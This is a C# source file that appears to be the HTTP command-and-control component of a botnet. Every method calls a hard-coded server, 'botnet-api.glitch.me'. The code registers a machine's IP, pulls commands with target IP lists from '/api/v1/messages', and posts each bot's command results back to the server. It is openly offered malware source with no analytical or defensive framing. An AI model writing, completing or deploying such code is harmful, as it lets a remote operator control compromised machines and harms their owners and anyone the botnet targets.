using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Web.Script.Serialization;

namespace HttpHandler
{
    public class Product
    {
        public string ip { get; set; }
    }
    public class Command
    {
        public uint id { get; set; }
        public string[] ip{ get; set; }
        public string command { get; set; }
    }
    public class Response
    {
        public string ip { get; set; }
        public string response { get; set; }
    }
    public class Class1
    {
        public static async Task IpDeleteAsync(string Id)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            await client.DeleteAsync($"/api/v1/ip/{Id}");
        }
        public static async Task SendResponse (string result, string MyIp )
        {
            HttpClient client = new HttpClient();
            Response response = new Response { ip = MyIp, response = result };
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            string json = new JavaScriptSerializer().Serialize(response);
            var resp = client.PostAsync($"/api/v1/responses/{MyIp}", new StringContent(json)).Result;
            resp.EnsureSuccessStatusCode();
        }
        public static async Task<UInt32> GetIdOfCommand(string path)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            uint idofcommands = 0;
            var response = client.GetAsync(path).Result;
            if (response.IsSuccessStatusCode)
            {
                idofcommands = await response.Content.ReadAsAsync<UInt32>();
                return idofcommands;
            }
            else
            {
                return idofcommands;
            }
        }
        public static async Task<UInt32> IdResult()
        {
            uint id = await GetIdOfCommand($"/api/v1/messages");
            return id;
        }

        public static async Task<T> GetCommandAssync<T>(string path)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            T command = default(T);
            var response = client.GetAsync(path).Result;
            if (response.IsSuccessStatusCode)
            {
                command = await response.Content.ReadAsAsync<T>();
                return command;
            }
            else
            {
                return command;
            }
        }
        public static async Task<UInt32> ResultIdCmd(string id)
        {
            var idcmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
            uint rescmd = idcmd.id;
            return rescmd;
        }
        public static async Task<List<string>> ResultIpCmdAsync(string id)
        {
            var ipcmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
            List<string> ipaddressescmd = new List<string> { };
            for (int i = 0; i < GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ip.Length; i++)
            {
                ipaddressescmd.Add(GetCommandAssync<Command>($"/api/v1/messages/{id}").Result.ip[i]);
            }
            return ipaddressescmd;
        }
        public static async Task<string> ResultCmd(string id)
        {
            var cmd = await GetCommandAssync<Command>($"/api/v1/messages/{id}");
            string rescmd = cmd.command;
            return rescmd;
        }
        static async Task<T> GetProductAsync<T>(string path)
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            T product = default(T);
            var response =  client.GetAsync(path).Result;
            if (response.IsSuccessStatusCode)
            {
                product = await response.Content.ReadAsAsync<T>();
            }
            response = null;
            return product;
        }
        public static async Task<List<string>> ResultIPTask()
        {
            var arr = await GetProductAsync<Product[]>("/api/v1/ip");
            List<string> ipaddresses = new List<string> { };
            for (int i = 0; i < arr.Length; i++)
            {
                ipaddresses.Add(arr[i].ip);
            }
            return ipaddresses;
        }
        public static async Task<UInt32> CreateIpAndIdAsync(string ip)
        {
            HttpClient client = new HttpClient();
            Product product = new Product {ip = ip};
            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
            string json = new JavaScriptSerializer().Serialize(product);
            HttpResponseMessage response = client.PostAsync("api/v1/ip", new StringContent(json)).Result;
            uint answer = response.Content.ReadAsAsync<UInt32>().Result;
            return answer;
        }

    }
}
